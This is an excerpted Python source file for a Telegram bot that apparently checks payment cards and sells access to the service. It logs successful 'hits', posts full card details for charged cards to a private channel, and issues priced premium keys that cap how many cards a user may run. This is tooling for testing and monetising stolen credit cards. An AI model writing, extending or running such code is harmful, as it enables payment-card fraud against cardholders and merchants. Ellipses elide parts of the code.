...
# ========================= Channel logging =========================
async def log_redeem(user_id: int, key: str, limit: int, expiry: int):
    """Send key redemption log to the logs channel."""
    msg = pe(
        f"🔑 <b>Key Redeemed</b>\n"
        f"<b>{SEP}</b>\n"
        ...
        f"📋 <b>Limit</b>      »  {limit}\n"
        f"⏳ <b>Expires</b>    »  {time.ctime(expiry)}\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await asyncio.to_thread(_send_notification, CHANNEL_LOGS, msg)

async def send_channel_log(result, hit_type):
    """
    Send hit logs to channels.
    - CHANNEL_LOGS: masked card (no full CC)
    - CHANNEL_CHARGED: full card details (only for Charged hits)
    """
    ...
    # Send to logs channel with masked card
    masked_result = result.copy()
    masked_result['card'] = mask_card(result['card'])
    msg_logs = build_result_card(masked_result, bin_info, 0, "Channel")
    await asyncio.to_thread(_send_notification, CHANNEL_LOGS, msg_logs)

    # If Charged, send full details to charged channel
    if hit_type == "Charged":
        msg_charged = build_result_card(result, bin_info, 0, "Channel")
        await asyncio.to_thread(_send_notification, CHANNEL_CHARGED, msg_charged)
...
async def genkeys_command(event):
    ...
    if len(args) < 4:
        await event.reply(pe(
            f"<b>🔑 Generate Premium Keys</b>\n"
            f"<b>{SEP}</b>\n"
            f"Usage: <code>/genkeys &lt;amount&gt; &lt;hours&gt; &lt;user_limit&gt; [price]</code>\n"
            f"Example: <code>/genkeys 10 72 500</code>  → 10 keys valid 72h, limit 500 cards\n"
            f"Optional price (just for display): <code>/genkeys 5 24 1000 19.99</code>"
        ), parse_mode='html')
        return
    try:
        amount = int(args[1])
        ...
        await event.reply(pe(f"❌ <b>Invalid number format.</b>"), parse_mode='html')
        return
    if amount <= 0 or hours <= 0 or limit <= 0:
        await event.reply(pe(f"❌ <b>Values must be positive.</b>"), parse_mode='html')
        return
    keys = generate_keys(amount, hours, limit, price)
    key_list = "\n".join(f"<code>{k}</code>" for k in keys)
    expiry_time = time.ctime(int(time.time()) + hours * 3600)
    response = pe(
        f"<b>🔑 Generated {amount} Keys</b>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"⏳ <b>Validity:</b>  {hours} hours (until {expiry_time})\n"
        f"📋 <b>Limit:</b>    {limit} cards"
    )
    if price:
        response += f"\n💰 <b>Price:</b>    ${price:.2f}"
    response += f"</blockquote>\n<b>{SEP}</b>\n{key_list}\n<b>{SEP}</b>\nSend these keys to users: <code>/redeem &lt;key&gt;</code>"
...
async def redeem_command(event):
    ...
    if len(args) < 2:
        await event.reply(pe(
            f"<b>🔑 Redeem Premium Key</b>\n"
            f"<b>{SEP}</b>\n"
            f"Usage: <code>/redeem &lt;key&gt;</code>\n"
            f"Example: <code>/redeem ABC123XYZ456</code>"
        ), parse_mode='html')
        return
    key = args[1].strip()
    result = redeem_key(uid, key)
    if result['success']:
        await event.reply(pe(
            f"{result['message']}\n"
            f"<b>{SEP}</b>\n"
            f"✅ You now have premium access until {time.ctime(result['expiry'])}"
        ), parse_mode='html')
        await log_redeem(uid, key, result['limit'], result['expiry'])
    else:
        await event.reply(pe(result['message']), parse_mode='html')
...
def _register_commands():
    user_cmds = [
        ...
        {"command": "redeem",         "description": "🔑 Redeem a premium key: /redeem <key>"},
    ]
    admin_cmds = user_cmds + [
        ...
        {"command": "genkeys",    "description": "🔑 Generate keys: /genkeys amount hours limit [price]"},
    ]
